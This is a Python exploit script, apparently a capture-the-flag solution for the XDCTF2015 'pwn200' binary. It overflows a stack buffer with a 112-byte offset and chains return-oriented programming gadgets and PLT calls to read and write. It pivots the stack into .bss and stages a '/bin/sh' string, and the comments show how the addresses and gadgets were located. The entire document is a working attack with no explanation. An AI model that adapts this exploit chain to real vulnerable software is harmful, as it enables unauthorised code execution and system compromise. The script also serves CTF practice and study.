from zio import *
 
offset = 112
 
addr_plt_read  = 0x08048390   # objdump -d -j.plt bof | grep "read"
addr_plt_write = 0x080483c0   # objdump -d -j.plt bof | grep "write"
 
#./rp-lin-x86  --file=bof --rop=3 --unique > gadgets.txt
pppop_ret = 0x0804856c
pop_ebp_ret   =  0x08048453
leave_ret = 0x08048481
 
stack_size = 0x800
addr_bss   = 0x0804a020   # readelf -S bof | grep ".bss"
base_stage = addr_bss + stack_size
 
target = "./pwn200"
io   = zio((target))
 
io.read_until('Welcome to XDCTF2015~!\n')
io.gdb_hint([0x80484bd])
 
buf1  = 'A' * offset
buf1 += l32(addr_plt_read)
buf1 += l32(pppop_ret)
buf1 += l32(0)
buf1 += l32(base_stage)
buf1 += l32(100)
buf1 += l32(pop_ebp_ret)
buf1 += l32(base_stage)
buf1 += l32(leave_ret)
io.writeline(buf1)
 
cmd = "/bin/sh"
 
buf2 = 'AAAA'
buf2 += l32(addr_plt_write)
buf2 += 'AAAA'
buf2 += l32(1)
buf2 += l32(base_stage+80)
buf2 += l32(len(cmd))
buf2 += 'A' * (80-len(buf2))
buf2 += cmd + '\x00'
buf2 += 'A' * (100-len(buf2))
io.writeline(buf2)
io.interact()
